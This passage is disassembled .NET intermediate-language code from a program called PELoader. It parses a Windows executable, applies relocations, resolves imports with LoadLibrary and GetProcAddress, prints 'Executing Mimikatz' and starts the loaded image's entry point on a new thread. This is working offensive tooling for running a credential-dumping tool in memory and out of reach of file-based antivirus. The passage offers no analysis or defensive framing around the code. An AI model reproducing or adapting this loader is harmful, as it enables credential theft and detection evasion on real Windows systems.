    IL_02aa:  ldloc.s    V_14
    IL_02ac:  stloc.s    V_17
    IL_02ae:  ldloca.s   V_15
    IL_02b0:  ldfld      uint32 PELoader.NativeDeclarations/IMAGE_BASE_RELOCATION::SizeOfBlock
    IL_02b5:  stloc.s    V_18
    IL_02b7:  ldloc.s    V_14
    IL_02b9:  stloc.s    V_19
    IL_02bb:  br         IL_03b8

    IL_02c0:  nop
    IL_02c1:  ldloca.s   V_20
    IL_02c3:  initobj    PELoader.NativeDeclarations/IMAGE_BASE_RELOCATION
    IL_02c9:  ldloc.s    V_14
    IL_02cb:  ldloc.s    V_18
    IL_02cd:  call       native int [mscorlib]System.IntPtr::Add(native int,
                                                                 int32)
    IL_02d2:  stloc.s    V_21
    IL_02d4:  ldloc.s    V_21
    IL_02d6:  ldtoken    PELoader.NativeDeclarations/IMAGE_BASE_RELOCATION
    IL_02db:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
    IL_02e0:  call       object [mscorlib]System.Runtime.InteropServices.Marshal::PtrToStructure(native int,
                                                                                                 class [mscorlib]System.Type)
    IL_02e5:  unbox.any  PELoader.NativeDeclarations/IMAGE_BASE_RELOCATION
    IL_02ea:  stloc.s    V_20
    IL_02ec:  ldloc.s    V_9
    IL_02ee:  ldloca.s   V_15
    IL_02f0:  ldfld      uint32 PELoader.NativeDeclarations/IMAGE_BASE_RELOCATION::VirtualAdress
    IL_02f5:  call       native int [mscorlib]System.IntPtr::Add(native int,
                                                                 int32)
    IL_02fa:  stloc.s    V_22
    IL_02fc:  ldc.i4.0
    IL_02fd:  stloc.s    V_10
    IL_02ff:  br.s       IL_0362

    IL_0301:  nop
    IL_0302:  ldloc.s    V_19
    IL_0304:  ldc.i4.8
    IL_0305:  ldc.i4.2
    IL_0306:  ldloc.s    V_10
    IL_0308:  mul
    IL_0309:  add
    IL_030a:  call       int16 [mscorlib]System.Runtime.InteropServices.Marshal::ReadInt16(native int,
                                                                                           int32)
    IL_030f:  conv.u2
    IL_0310:  stloc.s    V_24
    IL_0312:  ldloc.s    V_24
    IL_0314:  ldc.i4.s   12
    IL_0316:  shr
    IL_0317:  conv.u2
    IL_0318:  stloc.s    V_25
    IL_031a:  ldloc.s    V_24
    IL_031c:  ldc.i4     0xfff
    IL_0321:  and
    IL_0322:  conv.u2
    IL_0323:  stloc.s    V_26
    IL_0325:  ldloc.s    V_25
    IL_0327:  stloc.s    V_48
    IL_0329:  ldloc.s    V_48
    IL_032b:  ldc.i4.0
    IL_032c:  beq.s      IL_0336

    IL_032e:  ldloc.s    V_48
    IL_0330:  ldc.i4.s   10
    IL_0332:  beq.s      IL_0338

    IL_0334:  br.s       IL_035b

    IL_0336:  br.s       IL_035b

    IL_0338:  ldloc.s    V_22
    IL_033a:  ldloc.s    V_26
    IL_033c:  call       native int [mscorlib]System.IntPtr::Add(native int,
                                                                 int32)
    IL_0341:  stloc.s    V_23
    IL_0343:  ldloc.s    V_23
    IL_0345:  call       int64 [mscorlib]System.Runtime.InteropServices.Marshal::ReadInt64(native int)
    IL_034a:  stloc.s    V_27
    IL_034c:  ldloc.s    V_23
    IL_034e:  ldloc.s    V_27
    IL_0350:  ldloc.s    V_13
    IL_0352:  add
    IL_0353:  call       void [mscorlib]System.Runtime.InteropServices.Marshal::WriteInt64(native int,
                                                                                           int64)
    IL_0358:  nop
    IL_0359:  br.s       IL_035b

    IL_035b:  nop
    IL_035c:  ldloc.s    V_10
    IL_035e:  ldc.i4.1
    IL_035f:  add
    IL_0360:  stloc.s    V_10
    IL_0362:  ldloc.s    V_10
    IL_0364:  ldloca.s   V_15
    IL_0366:  ldfld      uint32 PELoader.NativeDeclarations/IMAGE_BASE_RELOCATION::SizeOfBlock
    IL_036b:  conv.u8
    IL_036c:  ldloc.s    V_16
    IL_036e:  conv.i8
    IL_036f:  sub
    IL_0370:  ldc.i4.2
    IL_0371:  conv.i8
    IL_0372:  div
    IL_0373:  conv.i4
    IL_0374:  clt
    IL_0376:  stloc.s    V_45
    IL_0378:  ldloc.s    V_45
    IL_037a:  brtrue.s   IL_0301

    IL_037c:  ldloc.s    V_14
    IL_037e:  ldloc.s    V_18
    IL_0380:  call       native int [mscorlib]System.IntPtr::Add(native int,
                                                                 int32)
    IL_0385:  stloc.s    V_19
    IL_0387:  ldloc.s    V_18
    IL_0389:  ldloca.s   V_20
    IL_038b:  ldfld      uint32 PELoader.NativeDeclarations/IMAGE_BASE_RELOCATION::SizeOfBlock
    IL_0390:  add
    IL_0391:  stloc.s    V_18
    IL_0393:  ldloc.s    V_20
    IL_0395:  stloc.s    V_15
    IL_0397:  ldloc.s    V_17
    IL_0399:  ldloc.s    V_18
    IL_039b:  call       native int [mscorlib]System.IntPtr::Add(native int,
                                                                 int32)
    IL_03a0:  stloc.s    V_17
    IL_03a2:  ldloca.s   V_20
    IL_03a4:  ldfld      uint32 PELoader.NativeDeclarations/IMAGE_BASE_RELOCATION::SizeOfBlock
    IL_03a9:  ldc.i4.0
    IL_03aa:  ceq
    IL_03ac:  ldc.i4.0
    IL_03ad:  ceq
    IL_03af:  stloc.s    V_45
    IL_03b1:  ldloc.s    V_45
    IL_03b3:  brtrue.s   IL_03b7

    IL_03b5:  br.s       IL_03c0

    IL_03b7:  nop
    IL_03b8:  ldc.i4.1
    IL_03b9:  stloc.s    V_45
    IL_03bb:  br         IL_02c0

    IL_03c0:  ldloc.s    V_9
    IL_03c2:  ldloc.s    V_8
    IL_03c4:  callvirt   instance valuetype PELoader.PELoader/IMAGE_SECTION_HEADER[] PELoader.PELoader::get_ImageSectionHeaders()
    IL_03c9:  ldc.i4.1
    IL_03ca:  ldelema    PELoader.PELoader/IMAGE_SECTION_HEADER
    IL_03cf:  ldfld      uint32 PELoader.PELoader/IMAGE_SECTION_HEADER::VirtualAddress
    IL_03d4:  call       native int [mscorlib]System.IntPtr::Add(native int,
                                                                 int32)
    IL_03d9:  stloc.s    V_28
    IL_03db:  ldloc.s    V_9
    IL_03dd:  ldloc.s    V_8
    IL_03df:  callvirt   instance valuetype PELoader.PELoader/IMAGE_OPTIONAL_HEADER64 PELoader.PELoader::get_OptionalHeader64()
    IL_03e4:  ldfld      valuetype PELoader.PELoader/IMAGE_DATA_DIRECTORY PELoader.PELoader/IMAGE_OPTIONAL_HEADER64::ImportTable
    IL_03e9:  ldfld      uint32 PELoader.PELoader/IMAGE_DATA_DIRECTORY::VirtualAddress
    IL_03ee:  call       native int [mscorlib]System.IntPtr::Add(native int,
                                                                 int32)
    IL_03f3:  stloc.s    V_29
    IL_03f5:  ldloc.s    V_29
    IL_03f7:  ldc.i4.s   16
    IL_03f9:  call       native int [mscorlib]System.IntPtr::Add(native int,
                                                                 int32)
    IL_03fe:  call       int32 [mscorlib]System.Runtime.InteropServices.Marshal::ReadInt32(native int)
    IL_0403:  stloc.s    V_30
    IL_0405:  ldc.i4.0
    IL_0406:  stloc.s    V_31
    IL_0408:  br         IL_052d

    IL_040d:  nop
    IL_040e:  ldloc.s    V_9
    IL_0410:  ldc.i4.s   20
    IL_0412:  ldloc.s    V_31
    IL_0414:  mul
    IL_0415:  ldloc.s    V_8
    IL_0417:  callvirt   instance valuetype PELoader.PELoader/IMAGE_OPTIONAL_HEADER64 PELoader.PELoader::get_OptionalHeader64()
    IL_041c:  ldfld      valuetype PELoader.PELoader/IMAGE_DATA_DIRECTORY PELoader.PELoader/IMAGE_OPTIONAL_HEADER64::ImportTable
    IL_0421:  ldfld      uint32 PELoader.PELoader/IMAGE_DATA_DIRECTORY::VirtualAddress
    IL_0426:  add
    IL_0427:  call       native int [mscorlib]System.IntPtr::Add(native int,
                                                                 int32)
    IL_042c:  stloc.s    V_32
    IL_042e:  ldloc.s    V_32
    IL_0430:  ldc.i4.s   16
    IL_0432:  call       native int [mscorlib]System.IntPtr::Add(native int,
                                                                 int32)
    IL_0437:  call       int32 [mscorlib]System.Runtime.InteropServices.Marshal::ReadInt32(native int)
    IL_043c:  stloc.s    V_33
    IL_043e:  ldloc.s    V_9
    IL_0440:  ldloc.s    V_8
    IL_0442:  callvirt   instance valuetype PELoader.PELoader/IMAGE_SECTION_HEADER[] PELoader.PELoader::get_ImageSectionHeaders()
    IL_0447:  ldc.i4.1
    IL_0448:  ldelema    PELoader.PELoader/IMAGE_SECTION_HEADER
    IL_044d:  ldfld      uint32 PELoader.PELoader/IMAGE_SECTION_HEADER::VirtualAddress
    IL_0452:  ldloc.s    V_33
    IL_0454:  ldloc.s    V_30
    IL_0456:  sub
    IL_0457:  add
    IL_0458:  call       native int [mscorlib]System.IntPtr::Add(native int,
                                                                 int32)
    IL_045d:  stloc.s    V_34
    IL_045f:  ldloc.s    V_9
    IL_0461:  ldloc.s    V_32
    IL_0463:  ldc.i4.s   12
    IL_0465:  call       native int [mscorlib]System.IntPtr::Add(native int,
                                                                 int32)
    IL_046a:  call       int32 [mscorlib]System.Runtime.InteropServices.Marshal::ReadInt32(native int)
    IL_046f:  call       native int [mscorlib]System.IntPtr::Add(native int,
                                                                 int32)
    IL_0474:  stloc.s    V_35
    IL_0476:  ldloc.s    V_35
    IL_0478:  call       string [mscorlib]System.Runtime.InteropServices.Marshal::PtrToStringAnsi(native int)
    IL_047d:  stloc.s    V_36
    IL_047f:  ldloc.s    V_36
    IL_0481:  ldstr      ""
    IL_0486:  call       bool [mscorlib]System.String::op_Equality(string,
                                                                   string)
    IL_048b:  ldc.i4.0
    IL_048c:  ceq
    IL_048e:  stloc.s    V_45
    IL_0490:  ldloc.s    V_45
    IL_0492:  brtrue.s   IL_049a

    IL_0494:  nop
    IL_0495:  br         IL_053f

    IL_049a:  ldloc.s    V_36
    IL_049c:  call       native int PELoader.NativeDeclarations::LoadLibrary(string)
    IL_04a1:  stloc.s    V_37
    IL_04a3:  ldstr      "Loaded {0}"
    IL_04a8:  ldloc.s    V_36
    IL_04aa:  call       void [mscorlib]System.Console::WriteLine(string,
                                                                  object)
    IL_04af:  nop
    IL_04b0:  ldc.i4.1
    IL_04b1:  stloc.s    V_38
    IL_04b3:  br.s       IL_0517

    IL_04b5:  nop
    IL_04b6:  ldloc.s    V_9
    IL_04b8:  ldloc.s    V_34
    IL_04ba:  call       int32 [mscorlib]System.Runtime.InteropServices.Marshal::ReadInt32(native int)
    IL_04bf:  call       native int [mscorlib]System.IntPtr::Add(native int,
                                                                 int32)
    IL_04c4:  stloc.s    V_39
    IL_04c6:  ldloc.s    V_39
    IL_04c8:  ldc.i4.2
    IL_04c9:  call       native int [mscorlib]System.IntPtr::Add(native int,
                                                                 int32)
    IL_04ce:  call       string [mscorlib]System.Runtime.InteropServices.Marshal::PtrToStringAnsi(native int)
    IL_04d3:  stloc.s    V_40
    IL_04d5:  ldloc.s    V_37
    IL_04d7:  ldloc.s    V_40
    IL_04d9:  call       native int PELoader.NativeDeclarations::GetProcAddress(native int,
                                                                                string)
    IL_04de:  stloc.s    V_41
    IL_04e0:  ldloc.s    V_34
    IL_04e2:  ldloc.s    V_41
    IL_04e4:  call       int64 [mscorlib]System.IntPtr::op_Explicit(native int)
    IL_04e9:  call       void [mscorlib]System.Runtime.InteropServices.Marshal::WriteInt64(native int,
                                                                                           int64)
    IL_04ee:  nop
    IL_04ef:  ldloc.s    V_34
    IL_04f1:  ldc.i4.8
    IL_04f2:  call       native int [mscorlib]System.IntPtr::Add(native int,
                                                                 int32)
    IL_04f7:  stloc.s    V_34
    IL_04f9:  ldloc.s    V_40
    IL_04fb:  ldstr      ""
    IL_0500:  call       bool [mscorlib]System.String::op_Equality(string,
                                                                   string)
    IL_0505:  ldc.i4.0
    IL_0506:  ceq
    IL_0508:  stloc.s    V_45
    IL_050a:  ldloc.s    V_45
    IL_050c:  brtrue.s   IL_0510

    IL_050e:  br.s       IL_0526

    IL_0510:  nop
    IL_0511:  ldloc.s    V_38
    IL_0513:  ldc.i4.1
    IL_0514:  add
    IL_0515:  stloc.s    V_38
    IL_0517:  ldloc.s    V_38
    IL_0519:  ldc.i4     0x270f
    IL_051e:  clt
    IL_0520:  stloc.s    V_45
    IL_0522:  ldloc.s    V_45
    IL_0524:  brtrue.s   IL_04b5

    IL_0526:  nop
    IL_0527:  ldloc.s    V_31
    IL_0529:  ldc.i4.1
    IL_052a:  add
    IL_052b:  stloc.s    V_31
    IL_052d:  ldloc.s    V_31
    IL_052f:  ldc.i4     0x3e7
    IL_0534:  clt
    IL_0536:  stloc.s    V_45
    IL_0538:  ldloc.s    V_45
    IL_053a:  brtrue     IL_040d

    IL_053f:  ldstr      "Executing Mimikatz"
    IL_0544:  call       void [mscorlib]System.Console::WriteLine(string)
    IL_0549:  nop
    IL_054a:  ldloc.s    V_9
    IL_054c:  ldloc.s    V_8
    IL_054e:  callvirt   instance valuetype PELoader.PELoader/IMAGE_OPTIONAL_HEADER64 PELoader.PELoader::get_OptionalHeader64()
    IL_0553:  ldfld      uint32 PELoader.PELoader/IMAGE_OPTIONAL_HEADER64::AddressOfEntryPoint
    IL_0558:  call       native int [mscorlib]System.IntPtr::Add(native int,
                                                                 int32)
    IL_055d:  stloc.s    V_42
    IL_055f:  ldsfld     native int [mscorlib]System.IntPtr::Zero
    IL_0564:  ldc.i4.0
    IL_0565:  ldloc.s    V_42
    IL_0567:  ldsfld     native int [mscorlib]System.IntPtr::Zero
    IL_056c:  ldc.i4.0
    IL_056d:  ldsfld     native int [mscorlib]System.IntPtr::Zero
    IL_0572:  call       native int PELoader.NativeDeclarations::CreateThread(native int,
                                                                              uint32,
                                                                              native int,
                                                                              native int,
                                                                              uint32,
                                                                              native int)
    IL_0577:  stloc.s    V_43
    IL_0579:  ldloc.s    V_43
    IL_057b:  ldc.i4.m1
    IL_057c:  call       uint32 PELoader.NativeDeclarations::WaitForSingleObject(native int,
                                                                                 uint32)
    IL_0581:  pop
    IL_0582:  ldstr      "Thread Complete"
    IL_0587:  call       void [mscorlib]System.Console::WriteLine(string)
    IL_058c:  nop
    IL_058d:  ret
  } // end of method Program::Main

  .method public hidebysig specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ret
  } // end of method Program::.ctor

} // end of class PELoader.Program

.class public auto ansi beforefieldinit PELoader.PELoader
       extends [mscorlib]System.Object
{
  .class sequential ansi sealed nested public beforefieldinit IMAGE_DOS_HEADER
         extends [mscorlib]System.ValueType
  {
    .field public uint16 e_magic
    .field public uint16 e_cblp
    .field public uint16 e_cp
    .field public uint16 e_crlc
    .field public uint16 e_cparhdr
    .field public uint16 e_minalloc
    .field public uint16 e_maxalloc
    .field public uint16 e_ss
    .field public uint16 e_sp
    .field public uint16 e_csum
    .field public uint16 e_ip
    .field public uint16 e_cs
    .field public uint16 e_lfarlc
    .field public uint16 e_ovno
    .field public uint16 e_res_0
    .field public uint16 e_res_1
    .field public uint16 e_res_2
    .field public uint16 e_res_3
    .field public uint16 e_oemid
    .field public uint16 e_oeminfo
    .field public uint16 e_res2_0
    .field public uint16 e_res2_1
    .field public uint16 e_res2_2
    .field public uint16 e_res2_3
    .field public uint16 e_res2_4
    .field public uint16 e_res2_5
    .field public uint16 e_res2_6
    .field public uint16 e_res2_7
    .field public uint16 e_res2_8
    .field public uint16 e_res2_9
    .field public uint32 e_lfanew
  } // end of class IMAGE_DOS_HEADER

  .class sequential ansi sealed nested public beforefieldinit IMAGE_DATA_DIRECTORY
         extends [mscorlib]System.ValueType
  {
    .field public uint32 VirtualAddress
    .field public uint32 Size
  } // end of class IMAGE_DATA_DIRECTORY

  .class sequential ansi sealed nested public beforefieldinit IMAGE_OPTIONAL_HEADER32
         extends [mscorlib]System.ValueType
  {
    .pack 1
    .size 0
    .field public uint16 Magic
    .field public uint8 MajorLinkerVersion
    .field public uint8 MinorLinkerVersion
    .field public uint32 SizeOfCode
    .field public uint32 SizeOfInitializedData
    .field public uint32 SizeOfUninitializedData
    .field public uint32 AddressOfEntryPoint
    .field public uint32 BaseOfCode
    .field public uint32 BaseOfData
    .field public uint32 ImageBase
    .field public uint32 SectionAlignment
    .field public uint32 FileAlignment
    .field public uint16 MajorOperatingSystemVersion
    .field public uint16 MinorOperatingSystemVersion
    .field public uint16 MajorImageVersion
    .field public uint16 MinorImageVersion
    .field public uint16 MajorSubsystemVersion
    .field public uint16 MinorSubsystemVersion
    .field public uint32 Win32VersionValue
    .field public uint32 SizeOfImage
    .field public uint32 SizeOfHeaders
    .field public uint32 CheckSum
    .field public uint16 Subsystem
    .field public uint16 DllCharacteristics
    .field public uint32 SizeOfStackReserve
    .field public uint32 SizeOfStackCommit
    .field public uint32 SizeOfHeapReserve
    .field public uint32 SizeOfHeapCommit
    .field public uint32 LoaderFlags
    .field public uint32 NumberOfRvaAndSizes
    .field public valuetype PELoader.PELoader/IMAGE_DATA_DIRECTORY ExportTable
    .field public valuetype PELoader.PELoader/IMAGE_DATA_DIRECTORY ImportTable
    .field public valuetype PELoader.PELoader/IMAGE_DATA_DIRECTORY ResourceTable
    .field public valuetype PELoader.PELoader/IMAGE_DATA_DIRECTORY ExceptionTable
    .field public valuetype PELoader.PELoader/IMAGE_DATA_DIRECTORY CertificateTable
    .field public valuetype PELoader.PELoader/IMAGE_DATA_DIRECTORY BaseRelocationTable
    .field public valuetype PELoader.PELoader/IMAGE_DATA_DIRECTORY Debug
    .field public valuetype PELoader.PELoader/IMAGE_DATA_DIRECTORY Architecture
    .field public valuetype PELoader.PELoader/IMAGE_DATA_DIRECTORY GlobalPtr
    .field public valuetype PELoader.PELoader/IMAGE_DATA_DIRECTORY TLSTable
    .field public valuetype PELoader.PELoader/IMAGE_DATA_DIRECTORY LoadConfigTable
    .field public valuetype PELoader.PELoader/IMAGE_DATA_DIRECTORY BoundImport
    .field public valuetype PELoader.PELoader/IMAGE_DATA_DIRECTORY IAT
    .field public valuetype PELoader.PELoader/IMAGE_DATA_DIRECTORY DelayImportDescriptor
    .field public valuetype PELoader.PELoader/IMAGE_DATA_DIRECTORY CLRRuntimeHeader
    .field public valuetype PELoader.PELoader/IMAGE_DATA_DIRECTORY Reserved
  } // end of class IMAGE_OPTIONAL_HEADER32

  .class sequential ansi sealed nested public beforefieldinit IMAGE_OPTIONAL_HEADER64
         extends [mscorlib]System.ValueType
  {
    .pack 1
    .size 0
    .field public uint16 Magic
    .field public uint8 MajorLinkerVersion
    .field public uint8 MinorLinkerVersion
    .field public uint32 SizeOfCode
    .field public uint32 SizeOfInitializedData
    .field public uint32 SizeOfUninitializedData
    .field public uint32 AddressOfEntryPoint
    .field public uint32 BaseOfCode
    .field public uint64 ImageBase
    .field public uint32 SectionAlignment
    .field public uint32 FileAlignment
    .field public uint16 MajorOperatingSystemVersion
    .field public uint16 MinorOperatingSystemVersion
    .field public uint16 MajorImageVersion
    .field public uint16 MinorImageVersion
    .field public uint16 MajorSubsystemVersion
    .field public uint16 MinorSubsystemVersion
    .field public uint32 Win32VersionValue
    .field public uint32 SizeOfImage
    .field public uint32 SizeOfHeaders
    .field public uint32 CheckSum
    .field public uint16 Subsystem
    .field public uint16 DllCharacteristics
    .field public uint64 SizeOfStackReserve
    .field public uint64 SizeOfStackCommit
    .field public uint64 SizeOfHeapReserve
    .field public uint64 SizeOfHeapCommit
    .field public uint32 LoaderFlags
    .field public uint32 NumberOfRvaAndSizes
    .field public valuetype PELoader.PELoader/IMAGE_DATA_DIRECTORY ExportTable
    .field public valuetype PELoader.PELoader/IMAGE_DATA_DIRECTORY ImportTable
    .field public valuetype PELoader.PELoader/IMAGE_DATA_DIRECTORY ResourceTable
    .field public valuetype PELoader.PELoader/IMAGE_DATA_DIRECTORY ExceptionTable
    .field public valuetype PELoader.PELoader/IMAGE_DATA_DIRECTORY CertificateTable
    .field public valuetype PELoader.PELoader/IMAGE_DATA_DIRECTORY BaseRelocationTable
    .field public valuetype PELoader.PELoader/IMAGE_DATA_DIRECTORY Debug
    .field public valuetype PELoader.PELoader/IMAGE_DATA_DIRECTORY Architecture
    .field public valuetype PELoader.PELoader/IMAGE_DATA_DIRECTORY GlobalPtr
    .field public valuetype PELoader.PELoader/IMAGE_DATA_DIRECTORY TLSTable
    .field public valuetype PELoader.PELoader/IMAGE_DATA_DIRECTORY LoadConfigTable
    .field public valuetype PELoader.PELoader/IMAGE_DATA_DIRECTORY BoundImport
    .field public valuetype PELoader.PELoader/IMAGE_DATA_DIRECTORY IAT
    .field public valuetype PELoader.PELoader/IMAGE_DATA_DIRECTORY DelayImportDescriptor
    .field public valuetype PELoader.PELoader/IMAGE_DATA_DIRECTORY CLRRuntimeHeader
    .field public valuetype PELoader.PELoader/IMAGE_DATA_DIRECTORY Reserved
  } // end of class IMAGE_OPTIONAL_HEADER64

  .class sequential ansi sealed nested public beforefieldinit IMAGE_FILE_HEADER
         extends [mscorlib]System.ValueType
  {
    .pack 1
    .size 0
    .field public uint16 Machine
    .field public uint16 NumberOfSections
    .field public uint32 TimeDateStamp
    .field public uint32 PointerToSymbolTable
    .field public uint32 NumberOfSymbols
    .field public uint16 SizeOfOptionalHeader
    .field public uint16 Characteristics
  } // end of class IMAGE_FILE_HEADER

  .class explicit ansi sealed nested public beforefieldinit IMAGE_SECTION_HEADER
         extends [mscorlib]System.ValueType
  {
    .field [0] public  marshal( fixed array [8]) char[] Name
    .field [8] public uint32 VirtualSize
    .field [12] public uint32 VirtualAddress
    .field [16] public uint32 SizeOfRawData
    .field [20] public uint32 PointerToRawData
    .field [24] public uint32 PointerToRelocations
    .field [28] public uint32 PointerToLinenumbers
    .field [32] public uint16 NumberOfRelocations
    .field [34] public uint16 NumberOfLinenumbers
    .field [36] public valuetype PELoader.PELoader/DataSectionFlags Characteristics
    .method public hidebysig specialname 
            instance string  get_Section() cil managed
    {
      // Code size       17 (0x11)
      .maxstack  1
      .locals init (string V_0)
      IL_0000:  nop
      IL_0001:  ldarg.0
      IL_0002:  ldfld      char[] PELoader.PELoader/IMAGE_SECTION_HEADER::Name
      IL_0007:  newobj     instance void [mscorlib]System.String::.ctor(char[])
      IL_000c:  stloc.0
      IL_000d:  br.s       IL_000f

      IL_000f:  ldloc.0
      IL_0010:  ret
    } // end of method IMAGE_SECTION_HEADER::get_Section

    .property instance string Section()
    {
      .get instance string PELoader.PELoader/IMAGE_SECTION_HEADER::get_Section()
    } // end of property IMAGE_SECTION_HEADER::Section
  } // end of class IMAGE_SECTION_HEADER

  .class sequential ansi sealed nested public beforefieldinit IMAGE_BASE_RELOCATION
         extends [mscorlib]System.ValueType
  {
    .field public uint32 VirtualAdress
    .field public uint32 SizeOfBlock
  } // end of class IMAGE_BASE_RELOCATION

  .class auto ansi sealed nested public DataSectionFlags
         extends [mscorlib]System.Enum
  {
    .custom instance void [mscorlib]System.FlagsAttribute::.ctor() = ( 01 00 00 00 ) 
    .field public specialname rtspecialname uint32 value__
    .field public static literal valuetype PELoader.PELoader/DataSectionFlags Stub = uint32(0x00000000)
  } // end of class DataSectionFlags

  .field private valuetype PELoader.PELoader/IMAGE_DOS_HEADER dosHeader
  .field private valuetype PELoader.PELoader/IMAGE_FILE_HEADER fileHeader
  .field private valuetype PELoader.PELoader/IMAGE_OPTIONAL_HEADER32 optionalHeader32
  .field private valuetype PELoader.PELoader/IMAGE_OPTIONAL_HEADER64 optionalHeader64
  .field private valuetype PELoader.PELoader/IMAGE_SECTION_HEADER[] imageSectionHeaders
  .field private uint8[] rawbytes
  .method public hidebysig specialname rtspecialname 
          instance void  .ctor(string filePath) cil managed
  {
    // Code size       229 (0xe5)
    .maxstack  3
    .locals init (class [mscorlib]System.IO.FileStream V_0,
             class [mscorlib]System.IO.BinaryReader V_1,
             uint32 V_2,
             int32 V_3,
             bool V_4)
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  nop
    IL_0007:  nop
    IL_0008:  ldarg.1
    IL_0009:  ldc.i4.3
    IL_000a:  ldc.i4.1
    IL_000b:  newobj     instance void [mscorlib]System.IO.FileStream::.ctor(string,
                                                                             valuetype [mscorlib]System.IO.FileMode,
                                                                             valuetype [mscorlib]System.IO.FileAccess)
    IL_0010:  stloc.0
    .try
    {
      IL_0011:  nop
      IL_0012:  ldloc.0
      IL_0013:  newobj     instance void [mscorlib]System.IO.BinaryReader::.ctor(class [mscorlib]System.IO.Stream)
      IL_0018:  stloc.1
      IL_0019:  ldarg.0
      IL_001a:  ldloc.1
      IL_001b:  call       !!0 PELoader.PELoader::FromBinaryReader<valuetype PELoader.PELoader/IMAGE_DOS_HEADER>(class [mscorlib]System.IO.BinaryReader)
      IL_0020:  stfld      valuetype PELoader.PELoader/IMAGE_DOS_HEADER PELoader.PELoader::dosHeader
      IL_0025:  ldloc.0
      IL_0026:  ldarg.0
      IL_0027:  ldflda     valuetype PELoader.PELoader/IMAGE_DOS_HEADER PELoader.PELoader::dosHeader
      IL_002c:  ldfld      uint32 PELoader.PELoader/IMAGE_DOS_HEADER::e_lfanew
      IL_0031:  conv.u8
      IL_0032:  ldc.i4.0
      IL_0033:  callvirt   instance int64 [mscorlib]System.IO.Stream::Seek(int64,
                                                                           valuetype [mscorlib]System.IO.SeekOrigin)
      IL_0038:  pop
      IL_0039:  ldloc.1
      IL_003a:  callvirt   instance uint32 [mscorlib]System.IO.BinaryReader::ReadUInt32()
      IL_003f:  stloc.2
      IL_0040:  ldarg.0
      IL_0041:  ldloc.1
      IL_0042:  call       !!0 PELoader.PELoader::FromBinaryReader<valuetype PELoader.PELoader/IMAGE_FILE_HEADER>(class [mscorlib]System.IO.BinaryReader)
      IL_0047:  stfld      valuetype PELoader.PELoader/IMAGE_FILE_HEADER PELoader.PELoader::fileHeader
      IL_004c:  ldarg.0
      IL_004d:  call       instance bool PELoader.PELoader::get_Is32BitHeader()
      IL_0052:  ldc.i4.0
      IL_0053:  ceq
      IL_0055:  stloc.s    V_4
      IL_0057:  ldloc.s    V_4
      IL_0059:  brtrue.s   IL_006b

      IL_005b:  nop
      IL_005c:  ldarg.0
      IL_005d:  ldloc.1
      IL_005e:  call       !!0 PELoader.PELoader::FromBinaryReader<valuetype PELoader.PELoader/IMAGE_OPTIONAL_HEADER32>(class [mscorlib]System.IO.BinaryReader)
      IL_0063:  stfld      valuetype PELoader.PELoader/IMAGE_OPTIONAL_HEADER32 PELoader.PELoader::optionalHeader32
      IL_0068:  nop
      IL_0069:  br.s       IL_0079

      IL_006b:  nop
      IL_006c:  ldarg.0
      IL_006d:  ldloc.1
      IL_006e:  call       !!0 PELoader.PELoader::FromBinaryReader<valuetype PELoader.PELoader/IMAGE_OPTIONAL_HEADER64>(class [mscorlib]System.IO.BinaryReader)
      IL_0073:  stfld      valuetype PELoader.PELoader/IMAGE_OPTIONAL_HEADER64 PELoader.PELoader::optionalHeader64
      IL_0078:  nop
      IL_0079:  ldarg.0
      IL_007a:  ldarg.0
      IL_007b:  ldflda     valuetype PELoader.PELoader/IMAGE_FILE_HEADER PELoader.PELoader::fileHeader
      IL_0080:  ldfld      uint16 PELoader.PELoader/IMAGE_FILE_HEADER::NumberOfSections
      IL_0085:  newarr     PELoader.PELoader/IMAGE_SECTION_HEADER
      IL_008a:  stfld      valuetype PELoader.PELoader/IMAGE_SECTION_HEADER[] PELoader.PELoader::imageSectionHeaders
      IL_008f:  ldc.i4.0
      IL_0090:  stloc.3
      IL_0091:  br.s       IL_00b0

      IL_0093:  nop
      IL_0094:  ldarg.0
      IL_0095:  ldfld      valuetype PELoader.PELoader/IMAGE_SECTION_HEADER[] PELoader.PELoader::imageSectionHeaders
      IL_009a:  ldloc.3
      IL_009b:  ldelema    PELoader.PELoader/IMAGE_SECTION_HEADER
      IL_00a0:  ldloc.1
      IL_00a1:  call       !!0 PELoader.PELoader::FromBinaryReader<valuetype PELoader.PELoader/IMAGE_SECTION_HEADER>(class [mscorlib]System.IO.BinaryReader)
      IL_00a6:  stobj      PELoader.PELoader/IMAGE_SECTION_HEADER
      IL_00ab:  nop
      IL_00ac:  ldloc.3
      IL_00ad:  ldc.i4.1
      IL_00ae:  add
      IL_00af:  stloc.3
      IL_00b0:  ldloc.3
      IL_00b1:  ldarg.0
      IL_00b2:  ldfld      valuetype PELoader.PELoader/IMAGE_SECTION_HEADER[] PELoader.PELoader::imageSectionHeaders
      IL_00b7:  ldlen
      IL_00b8:  conv.i4
      IL_00b9:  clt
      IL_00bb:  stloc.s    V_4
      IL_00bd:  ldloc.s    V_4
      IL_00bf:  brtrue.s   IL_0093

      IL_00c1:  ldarg.0
      IL_00c2:  ldarg.1
      IL_00c3:  call       uint8[] [mscorlib]System.IO.File::ReadAllBytes(string)
      IL_00c8:  stfld      uint8[] PELoader.PELoader::rawbytes
      IL_00cd:  nop
      IL_00ce:  leave.s    IL_00e2

    }  // end .try
    finally
    {
      IL_00d0:  ldloc.0
      IL_00d1:  ldnull
      IL_00d2:  ceq
      IL_00d4:  stloc.s    V_4
      IL_00d6:  ldloc.s    V_4
      IL_00d8:  brtrue.s   IL_00e1

      IL_00da:  ldloc.0
      IL_00db:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
      IL_00e0:  nop
      IL_00e1:  endfinally
    }  // end handler
    IL_00e2:  nop
    IL_00e3:  nop
    IL_00e4:  ret
  } // end of method PELoader::.ctor

  .method public hidebysig specialname rtspecialname 
          instance void  .ctor(uint8[] fileBytes) cil managed
  {
    // Code size       226 (0xe2)
    .maxstack  3
    .locals init (class [mscorlib]System.IO.MemoryStream V_0,
             class [mscorlib]System.IO.BinaryReader V_1,
             uint32 V_2,
             int32 V_3,
             bool V_4)
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
